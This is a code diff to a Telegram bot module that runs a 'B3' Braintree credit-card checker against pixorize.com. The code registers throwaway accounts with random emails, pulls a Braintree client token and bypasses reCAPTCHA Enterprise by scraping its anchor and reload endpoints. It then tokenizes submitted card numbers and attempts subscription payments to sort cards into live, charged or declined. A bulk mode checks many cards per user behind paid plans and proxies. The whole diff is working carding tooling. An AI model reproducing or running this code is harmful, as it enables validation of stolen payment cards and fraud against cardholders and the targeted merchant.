@@ -3,345 +3,244 @@ import json
 import requests
 import asyncio
 import base64
+import random
 from time import time
+from urllib.parse import urlparse, parse_qs
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ChatType
 from BOT.tools.proxy import get_proxy
-from faker import Faker
-from fake_useragent import UserAgent
 
 user_locks = {}
 
-# B3 (Braintree) Gate Class
-class B3Gate:
-    """Braintree Pixorize Gate"""
-    
-    def __init__(self, proxy=None):
-        self.s = requests.Session()
-        self.proxy = proxy
-        self.fake = Faker('en_US')
+
+def recaptcha_bypass():
+    """Bypass reCAPTCHA for Pixorize - EXACT original code"""
+    anchor_url = "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD&co=aHR0cHM6Ly9waXhvcml6ZS5jb206NDQz&hl=en&v=_mscDd1KHr60EWWbt2I_ULP0&size=invisible&anchor-ms=20000&execute-ms=15000&cb=9rxqj565e126"
+    reload_url = "https://www.google.com/recaptcha/enterprise/reload?k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD"    
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"}
+    parsed_url = urlparse(anchor_url)
+    params = parse_qs(parsed_url.query)
+    response = requests.get(anchor_url, headers=headers, timeout=30)
+    token = re.search(r'value="([^"]+)"', response.text).group(1)
+    data = {'v': params['v'][0],'reason': 'q','c': token,'k': params['k'][0],'co': params['co'][0],'hl': 'tr','size': 'invisible'}
+    headers.update({"Referer": response.url,"Content-Type": "application/x-www-form-urlencoded"})
+    response = requests.post(reload_url, headers=headers, data=data, timeout=30)
+    return re.search(r'\["rresp","([^"]+)"', response.text).group(1)
+
+
+def check_b3_card(cc, mm, yy, cvv, proxy=None):
+    """B3 Braintree check - EXACT original API copy"""
+    try:
+        # Format year exactly as original
+        if len(yy) == 4:
+            yy = yy[2] + yy[3]  # exact original: exy=exy[2]+exy[3]
         
-        try:
-            ua = UserAgent()
-            self.user_agent = ua.random
-        except:
-            self.user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
+        r = requests.session()
         
         if proxy:
-            self.s.proxies = {'http': proxy, 'https': proxy}
-    
-    def recaptcha_bypass(self):
-        """Bypass reCAPTCHA for Pixorize"""
+            r.proxies = {'http': proxy, 'https': proxy}
+        
+        # Generate random email - exact as original
+        j = "1234567890qawsedzrtzfgxyuchjbiokblpn"
+        em = random.choice(j)*2 + random.choice(j)*2 + random.choice(j)*2 + random.choice(j) + random.choice(j)
+        
+        # Step 1: Register - exact as original
+        url = "https://apitwo.pixorize.com/users/register-simple"
+        
+        payload = {
+            "email": em + "@gmail.com",
+            "password": "jdjrj@#818",
+            "learner_classification": 1
+        }
+        
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+            'Content-Type': "application/json",
+            'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
+            'sec-ch-ua-platform': "\"Android\"",
+            'sec-ch-ua-mobile': "?1",
+            'Origin': "https://pixorize.com",
+            'Sec-Fetch-Site': "same-site",
+            'Sec-Fetch-Mode': "cors",
+            'Sec-Fetch-Dest': "empty",
+            'Referer': "https://pixorize.com/",
+            'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
+        }
+        
+        response = r.post(url, data=json.dumps(payload), headers=headers, timeout=30)
+        
+        # Step 2: Get braintree token - exact as original
+        url = "https://apitwo.pixorize.com/braintree/token"
+        
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+            'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
+            'sec-ch-ua-mobile': "?1",
+            'sec-ch-ua-platform': "\"Android\"",
+            'Origin': "https://pixorize.com",
+            'Sec-Fetch-Site': "same-site",
+            'Sec-Fetch-Mode': "cors",
+            'Sec-Fetch-Dest': "empty",
+            'Referer': "https://pixorize.com/",
+            'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
+        }
+        
+        response = r.get(url, headers=headers, cookies=r.cookies, timeout=30)
+        
         try:
-            anchor_url = "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD&co=aHR0cHM6Ly9waXhvcml6ZS5jb206NDQz&hl=en&v=_mscDd1KHr60EWWbt2I_ULP0&size=invisible&anchor-ms=20000&execute-ms=15000&cb=9rxqj565e126"
-            reload_url = "https://www.google.com/recaptcha/enterprise/reload?k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD"
-            
-            from urllib.parse import urlparse, parse_qs
-            
-            headers = {
-                "User-Agent": self.user_agent
-            }
-            
-            parsed_url = urlparse(anchor_url)
-            params = parse_qs(parsed_url.query)
-            
-            response = self.s.get(anchor_url, headers=headers, timeout=30)
-            token_match = re.search(r'value="([^"]+)"', response.text)
-            if not token_match:
-                return None
-            token = token_match.group(1)
-            
-            data = {
-                'v': params['v'][0],
-                'reason': 'q',
-                'c': token,
-                'k': params['k'][0],
-                'co': params['co'][0],
-                'hl': 'tr',
-                'size': 'invisible'
-            }
-            
-            headers.update({
-                "Referer": response.url,
-                "Content-Type": "application/x-www-form-urlencoded"
-            })
-            
-            response = self.s.post(reload_url, headers=headers, data=data, timeout=30)
-            captcha_match = re.search(r'\["rresp","([^"]+)"', response.text)
-            if captcha_match:
-                return captcha_match.group(1)
-            return None
+            au = response.json()['payload']['clientToken']
+            base4 = str(base64.b64decode(au))
+            auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]
         except Exception as e:
-            return None
-    
-    def check_card(self, cc, mm, yy, cvv):
-        """Full Braintree check via Pixorize"""
-        try:
-            import random
-            import string
-            
-            # Generate random email
-            j = "1234567890qawsedzrtzfgxyuchjbiokblpn"
-            em = ''.join(random.choice(j) for _ in range(8))
-            email = em + "@gmail.com"
-            
-            # Format year
-            if len(yy) == 4:
-                yy = yy[2:4]
-            
-            # Step 1: Register user
-            url = "https://apitwo.pixorize.com/users/register-simple"
-            
-            payload = {
-                "email": email,
-                "password": "jdjrj@#818",
-                "learner_classification": 1
-            }
-            
-            headers = {
-                'User-Agent': self.user_agent,
-                'Content-Type': "application/json",
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-ch-ua-mobile': '?1',
-                'Origin': "https://pixorize.com",
-                'Sec-Fetch-Site': "same-site",
-                'Sec-Fetch-Mode': "cors",
-                'Sec-Fetch-Dest': "empty",
-                'Referer': "https://pixorize.com/",
-                'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
-            }
-            
-            response = self.s.post(url, json=payload, headers=headers, timeout=30)
-            
-            if response.status_code != 200 and response.status_code != 201:
-                return "Declined ❌", "Registration Failed"
-            
-            # Step 2: Get Braintree token
-            url = "https://apitwo.pixorize.com/braintree/token"
-            
-            headers = {
-                'User-Agent': self.user_agent,
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-platform': '"Android"',
-                'Origin': "https://pixorize.com",
-                'Sec-Fetch-Site': "same-site",
-                'Sec-Fetch-Mode': "cors",
-                'Sec-Fetch-Dest': "empty",
-                'Referer': "https://pixorize.com/",
-                'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
-            }
-            
-            response = self.s.get(url, headers=headers, cookies=self.s.cookies, timeout=30)
-            
-            try:
-                au = response.json()['payload']['clientToken']
-                base4 = str(base64.b64decode(au))
-                auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]
-            except:
-                return "Declined ❌", "Token Error"
-            
-            # Step 3: Tokenize card
-            url = "https://payments.braintree-api.com/graphql"
-            
-            payload = {
-                "clientSdkMetadata": {
-                    "source": "client",
-                    "integration": "dropin2",
-                    "sessionId": "90ec9e6b-9389-45c9-9542-ba6271ad49c6"
-                },
-                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
-                "variables": {
-                    "input": {
-                        "creditCard": {
-                            "number": cc,
-                            "expirationMonth": mm,
-                            "expirationYear": "20" + yy,
-                            "cvv": cvv,
-                            "billingAddress": {
-                                "postalCode": "10090"
-                            }
-                        },
-                        "options": {
-                            "validate": False
+            return "Declined ❌", f"Token Error"
+        
+        # Step 3: Tokenize card - exact as original (uses requests.post not session!)
+        url = "https://payments.braintree-api.com/graphql"
+        
+        payload = {
+            "clientSdkMetadata": {
+                "source": "client",
+                "integration": "dropin2",
+                "sessionId": "90ec9e6b-9389-45c9-9542-ba6271ad49c6"
+            },
+            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
+            "variables": {
+                "input": {
+                    "creditCard": {
+                        "number": cc,
+                        "expirationMonth": mm,
+                        "expirationYear": "20" + yy,
+                        "cvv": cvv,
+                        "billingAddress": {
+                            "postalCode": "10090"
                         }
+                    },
+                    "options": {
+                        "validate": False
                     }
-                },
-                "operationName": "TokenizeCreditCard"
-            }
-            
-            headers = {
-                'User-Agent': self.user_agent,
-                'Content-Type': "application/json",
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-mobile': '?1',
-                'authorization': "Bearer " + auth,
-                'braintree-version': "2018-05-10",
-                'sec-ch-ua-platform': '"Android"',
-                'origin': "https://assets.braintreegateway.com",
-                'sec-fetch-site': "cross-site",
-                'sec-fetch-mode': "cors",
-                'sec-fetch-dest': "empty",
-                'referer': "https://assets.braintreegateway.com/",
-                'accept-language': "en-US,en;q=0.9,ar;q=0.8"
-            }
-            
-            response = self.s.post(url, json=payload, headers=headers, timeout=30)
-            
+                }
+            },
+            "operationName": "TokenizeCreditCard"
+        }
+        
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+            'Content-Type': "application/json",
+            'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
+            'sec-ch-ua-mobile': "?1",
+            'authorization': "Bearer " + auth,
+            'braintree-version': "2018-05-10",
+            'sec-ch-ua-platform': "\"Android\"",
+            'origin': "https://assets.braintreegateway.com",
+            'sec-fetch-site': "cross-site",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-dest': "empty",
+            'referer': "https://assets.braintreegateway.com/",
+            'accept-language': "en-US,en;q=0.9,ar;q=0.8"
+        }
+        
+        # IMPORTANT: Original uses requests.post directly, not the session!
+        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
+        
+        try:
+            token = response.json()["data"]["tokenizeCreditCard"]["token"]
+        except:
+            return "Declined ❌", "Tokenize Failed"
+        
+        # Step 4: Get captcha
+        try:
+            captcha_token = recaptcha_bypass()
+        except:
+            return "Declined ❌", "Captcha Failed"
+        
+        # Step 5: Make payment - exact as original
+        url = "https://apitwo.pixorize.com/braintree/pay"
+        
+        payload = {
+            "subscriptionTypeId": 26,
+            "nonce": token,
+            "deviceData": "{\"device_session_id\":\"1828806e70140be76f80b47aa269ef20\",\"fraud_merchant_id\":null,\"correlation_id\":\"8adec9342087be4c33374c6ab459cb56\"}",
+            "promoCode": None,
+            "captchaToken": captcha_token
+        }
+        
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+            'Content-Type': "application/json",
+            'sec-ch-ua': "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
+            'sec-ch-ua-platform': "\"Android\"",
+            'sec-ch-ua-mobile': "?1",
+            'Origin': "https://pixorize.com",
+            'Sec-Fetch-Site': "same-site",
+            'Sec-Fetch-Mode': "cors",
+            'Sec-Fetch-Dest': "empty",
+            'Referer': "https://pixorize.com/",
+            'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
+        }
+        
+        response = r.post(url, data=json.dumps(payload), headers=headers, cookies=r.cookies, timeout=30)
+        result = response.text
+        
+        # Parse response based on user's specified responses
+        if "Card Issuer Declined CVV" in result:
+            return "Approved ✅", "CVV Declined"
+        elif "Reason: CVV" in result:
+            return "Approved ✅", "CVV Error"
+        elif "Insufficient Funds" in result:
+            return "Approved ✅", "Insufficient Funds"
+        elif "Call Issuer" in result and "Pick Up Card" in result:
+            return "Declined ❌", "Pick Up Card"
+        elif "Call Issuer" in result:
+            return "Declined ❌", "Call Issuer"
+        elif "Transaction Not Allowed" in result:
+            return "Declined ❌", "Transaction Not Allowed"
+        elif "Card Not Activated" in result:
+            return "Declined ❌", "Card Not Activated"
+        elif "Closed Card" in result:
+            return "Declined ❌", "Closed Card"
+        elif "Do Not Honor" in result:
+            return "Declined ❌", "Do Not Honor"
+        elif "No Account" in result:
+            return "Declined ❌", "No Account"
+        elif "Expired Card" in result:
+            return "Declined ❌", "Expired Card"
+        elif "Cannot Authorize" in result and "Policy" in result:
+            return "Declined ❌", "Cannot Authorize (Policy)"
+        elif "Cannot Authorize" in result and "Life cycle" in result:
+            return "Declined ❌", "Cannot Authorize (Lifecycle)"
+        elif "No Such Issuer" in result:
+            return "Declined ❌", "No Such Issuer"
+        elif "Processor Declined" in result and "Fraud" in result:
+            return "Declined ❌", "Fraud Suspected"
+        elif "Processor Declined" in result:
+            return "Declined ❌", "Processor Declined"
+        elif "restriction on the card" in result:
+            return "Declined ❌", "Card Restricted"
+        elif "Credit card number is invalid" in result:
+            return "Declined ❌", "Invalid Card Number"
+        elif "success" in result.lower():
+            return "Charged 💎", "Payment Success"
+        elif "subscription" in result.lower() and "error" not in result.lower():
+            return "Charged 💎", "Success"
+        else:
+            # Try to extract message from JSON
             try:
-                token = response.json()["data"]["tokenizeCreditCard"]["token"]
-            except:
-                # Check for errors
-                try:
-                    errors = response.json().get("errors", [])
-                    if errors:
-                        error_msg = errors[0].get("message", "Token Error")
-                        return "Declined ❌", error_msg[:40]
-                except:
-                    pass
-                return "Declined ❌", "Tokenize Error"
-            
-            # Step 4: Get captcha
-            captcha_token = self.recaptcha_bypass()
-            if not captcha_token:
-                return "Declined ❌", "Captcha Error"
-            
-            # Step 5: Process payment
-            url = "https://apitwo.pixorize.com/braintree/pay"
-            
-            payload = {
-                "subscriptionTypeId": 26,
-                "nonce": token,
-                "deviceData": '{"device_session_id":"1828806e70140be76f80b47aa269ef20","fraud_merchant_id":null,"correlation_id":"8adec9342087be4c33374c6ab459cb56"}',
-                "promoCode": None,
-                "captchaToken": captcha_token
-            }
-            
-            headers = {
-                'User-Agent': self.user_agent,
-                'Content-Type': "application/json",
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-ch-ua-mobile': '?1',
-                'Origin': "https://pixorize.com",
-                'Sec-Fetch-Site': "same-site",
-                'Sec-Fetch-Mode': "cors",
-                'Sec-Fetch-Dest': "empty",
-                'Referer': "https://pixorize.com/",
-                'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
-            }
-            
-            response = self.s.post(url, json=payload, headers=headers, cookies=self.s.cookies, timeout=30)
-            response_text = response.text
-            
-            # Parse Braintree/Pixorize specific responses
-            # CVV Declined = Live (card is valid)
-            if "Card Issuer Declined CVV" in response_text:
-                return "Approved ✅", "CVV Declined"
-            
-            elif "Reason: CVV" in response_text:
-                return "Approved ✅", "CVV Error"
-            
-            # Insufficient Funds = Live
-            elif "Insufficient Funds" in response_text:
-                return "Approved ✅", "Insufficient Funds"
-            
-            # Success/Charged
-            elif 'success' in response_text.lower() or 'charged' in response_text.lower():
-                return "Charged 💎", "Payment Success"
-            
-            # Declined responses
-            elif "Call Issuer" in response_text and "Pick Up Card" in response_text:
-                return "Declined ❌", "Call Issuer - Pick Up Card"
-            
-            elif "Call Issuer" in response_text:
-                return "Declined ❌", "Call Issuer"
-            
-            elif "Transaction Not Allowed" in response_text:
-                return "Declined ❌", "Transaction Not Allowed"
-            
-            elif "Card Not Activated" in response_text:
-                return "Declined ❌", "Card Not Activated"
-            
-            elif "Closed Card" in response_text:
-                return "Declined ❌", "Closed Card"
-            
-            elif "Do Not Honor" in response_text:
-                return "Declined ❌", "Do Not Honor"
-            
-            elif "No Account" in response_text:
-                return "Declined ❌", "No Account"
-            
-            elif "Expired Card" in response_text:
-                return "Declined ❌", "Expired Card"
-            
-            elif "Cannot Authorize" in response_text and "Policy" in response_text:
-                return "Declined ❌", "Cannot Authorize (Policy)"
-            
-            elif "Cannot Authorize" in response_text and "Life cycle" in response_text:
-                return "Declined ❌", "Cannot Authorize (Lifecycle)"
-            
-            elif "No Such Issuer" in response_text:
-                return "Declined ❌", "No Such Issuer"
-            
-            elif "Fraud Suspected" in response_text:
-                return "Declined ❌", "Fraud Suspected"
-            
-            elif "Processor Declined" in response_text:
-                return "Declined ❌", "Processor Declined"
-            
-            elif "restriction on the card" in response_text:
-                return "Declined ❌", "Card Restricted"
-            
-            elif "Credit card number is invalid" in response_text:
-                return "Declined ❌", "Invalid Card Number"
-            
-            # Generic error parsing
-            try:
-                resp_json = response.json()
-                message = resp_json.get("message", "")
-                error = resp_json.get("error", "")
-                
-                msg_upper = (str(message) + str(error)).upper()
-                
-                # CVV/CVC errors = Approved (CCN)
-                if "CVV" in msg_upper or "CVC" in msg_upper or "SECURITY" in msg_upper:
-                    return "Approved ✅", message[:40] if message else "CVV Error"
-                
-                # Insufficient funds = Approved
-                elif "INSUFFICIENT" in msg_upper:
-                    return "Approved ✅", "Insufficient Funds"
-                
-                # Declined
-                elif "DECLINED" in msg_upper or "DENIED" in msg_upper:
-                    return "Declined ❌", message[:40] if message else "Card Declined"
-                
-                # Invalid card
-                elif "INVALID" in msg_upper or "INCORRECT" in msg_upper:
-                    return "Declined ❌", message[:40] if message else "Invalid Card"
-                
-                # Expired
-                elif "EXPIRED" in msg_upper:
-                    return "Declined ❌", "Expired Card"
-                
-                else:
-                    return "Declined ❌", message[:40] if message else "Unknown Error"
-                    
+                resp_json = json.loads(result)
+                msg = resp_json.get("message", resp_json.get("error", ""))
+                if msg:
+                    return "Declined ❌", str(msg)[:40]
             except:
                 pass
+            # Return raw result snippet if nothing matches
+            return "Declined ❌", result[:40] if result else "No Response"
             
-            return "Declined ❌", "Unknown Response"
-            
-        except requests.exceptions.Timeout:
-            return "Declined ❌", "Timeout"
-        except requests.exceptions.ProxyError:
-            return "Declined ❌", "Proxy Error"
-        except requests.exceptions.ConnectionError:
-            return "Declined ❌", "Connection Error"
-        except Exception as e:
-            return "Declined ❌", str(e)[:40]
+    except requests.exceptions.Timeout:
+        return "Declined ❌", "Timeout"
+    except requests.exceptions.ProxyError:
+        return "Declined ❌", "Proxy Error"
+    except Exception as e:
+        return "Declined ❌", str(e)[:40]
 
 
 def load_users():
@@ -422,20 +321,14 @@ def extract_card(text):
 def extract_cards(text):
     return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)
 
-def check_b3(cc, mm, yy, cvv, proxy=None):
-    """B3 check function"""
-    gate = B3Gate(proxy=proxy)
-    return gate.check_card(cc, mm, yy, cvv)
-
 def is_premium_user(user_id):
-    """Check if user is premium (not Free or Redeem Code)"""
     try:
         users = load_users()
         user = users.get(str(user_id))
         if not user:
             return False
-        plan = user.get("plan", {}).get("plan", "Free")
-        return plan not in ["Free", "Redeem Code"]
+        plan = user.get("plan", {}).get("plan", "Free").upper()
+        return plan not in ["FREE", "REDEEM CODE"]
     except:
         return False
 
@@ -445,20 +338,18 @@ def is_free_user(user_id):
         user = users.get(str(user_id))
         if not user:
             return True
-        plan = user.get("plan", {}).get("plan", "Free")
-        return plan in ["Free", "Redeem Code"]
+        plan = user.get("plan", {}).get("plan", "Free").upper()
+        return plan in ["FREE", "REDEEM CODE"]
     except:
         return True
 
 def get_owner_link():
-    """Get owner link from config"""
-    try:
-        with open("FILES/config.json", "r") as f:
-            config = json.load(f)
-        owner_id = config.get("OWNER", "")
-        return f"https://t.me/gitsus"
-    except:
-        return "https://t.me/gitsus"
+    return "https://t.me/gitsus"
+
+
+# Wrapper for async
+def check_b3(cc, mm, yy, cvv, proxy=None):
+    return check_b3_card(cc, mm, yy, cvv, proxy)
 
 
 @Client.on_message(filters.command("b3") & ~filters.edited)
@@ -483,10 +374,7 @@ async def b3_single(client, message):
             if is_free_user(user_id):
                 return await message.reply(
                     "<pre>Notification ❗️</pre>\n"
-                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
-                    "<b>~ Get Premium to use in private</b>\n"
-                    "━━━━━━━━━━━━━\n"
-                    "<b>Type <code>/buy</code> to get Premium.</b>",
+                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n",
                     reply_to_message_id=message.id
                 )
         elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
@@ -551,7 +439,6 @@ async def b3_single(client, message):
         plan = user_data.get("plan", {}).get("plan", "Free")
         badge = user_data.get("plan", {}).get("badge", "🎟️")
         
-        # Clickable username
         profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
         
         final_msg = f"""<b>[#B3] | Sos</b> ✦
@@ -587,7 +474,6 @@ async def b3_mass(client, message):
     if not message.from_user:
         return await message.reply("❌ Cannot process this message.")
     
-    # Premium only check
     if not is_premium_user(user_id):
         return await message.reply(
             "<pre>Notification ❗️</pre>\n"
@@ -614,11 +500,7 @@ async def b3_mass(client, message):
             if is_free_user(user_id):
                 user_locks.pop(user_id, None)
                 return await message.reply(
-                    "<pre>Notification ❗️</pre>\n"
-                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
-                    "<b>~ Get Premium to use in private</b>\n"
-                    "━━━━━━━━━━━━━\n"
-                    "<b>Type <code>/buy</code> to get Premium.</b>",
+                    "<pre>Notification ❗️</pre>\n<b>Free users can only check in groups!</b>",
                     reply_to_message_id=message.id
                 )
         elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
@@ -640,7 +522,7 @@ async def b3_mass(client, message):
         plan_info = user_data.get("plan", {})
         plan_name = plan_info.get("plan", "Free")
         
-        # Card limits based on plan - Ultimate: 100, VIP: 50, default: mlimit
+        # Card limits
         if plan_name.upper() == "ULTIMATE":
             mlimit = 100
         elif plan_name.upper() == "VIP":
@@ -690,7 +572,6 @@ async def b3_mass(client, message):
             except:
                 pass
         
-        # Clickable username
         checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a> [<code>{plan_name} {badge}</code>]"
         
         proxy = get_proxy(message.from_user.id)
@@ -720,12 +601,8 @@ async def b3_mass(client, message):
                     "━━━━━━━━━━━━"
                 )
                 
-                # Show ALL results, not just last 8
                 try:
-                    # Calculate how many results to show in progress update
-                    # Show all but cap message length
                     display_results = final_results if len(final_results) <= 20 else final_results[-20:]
-                    
                     await loader_msg.edit(
                         f"<pre>✦ [$mb3] | M-B3</pre>\n"
                         + "\n".join(display_results) + "\n"
@@ -742,14 +619,19 @@ async def b3_mass(client, message):
         if available_credits != "∞":
             deduct_credit_bulk(user_id, card_count)
         
-        # Final message - show ALL results
         final_text = f"<pre>✦ [$mb3] | M-B3</pre>\n"
         final_text += "\n".join(final_results) + "\n"
         final_text += f"<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>\n"
         final_text += f"<b>[ﾒ] Total:</b> <code>{card_count} cards</code>\n"
         final_text += f"<b>[ﾒ] Checked By:</b> {checked_by}"
         
-        # If message too long, send as file
+        buttons = InlineKeyboardMarkup([
+            [
+                InlineKeyboardButton("Support", url="https://t.me/gitsus"),
+                InlineKeyboardButton("Owner", url=get_owner_link())
+            ]
+        ])
+        
         if len(final_text) > 4000:
             import os
             os.makedirs("downloads", exist_ok=True)
@@ -765,13 +647,6 @@ async def b3_mass(client, message):
                 f.write(f"Time taken: {timetaken}s\n")
                 f.write(f"Total cards: {card_count}\n")
             
-            buttons = InlineKeyboardMarkup([
-                [
-                    InlineKeyboardButton("Support", url="https://t.me/gitsus"),
-                    InlineKeyboardButton("Owner", url=get_owner_link())
-                ]
-            ])
-            
             await message.reply_document(
                 filename,
                 caption=f"<pre>✦ [$mb3] | M-B3 Results</pre>\n"
@@ -784,13 +659,6 @@ async def b3_mass(client, message):
             await loader_msg.delete()
             os.remove(filename)
         else:
-            buttons = InlineKeyboardMarkup([
-                [
-                    InlineKeyboardButton("Support", url="https://t.me/gitsus"),
-                    InlineKeyboardButton("Owner", url=get_owner_link())
-                ]
-            ])
-            
             await loader_msg.edit(
                 final_text,
                 disable_web_page_preview=True,
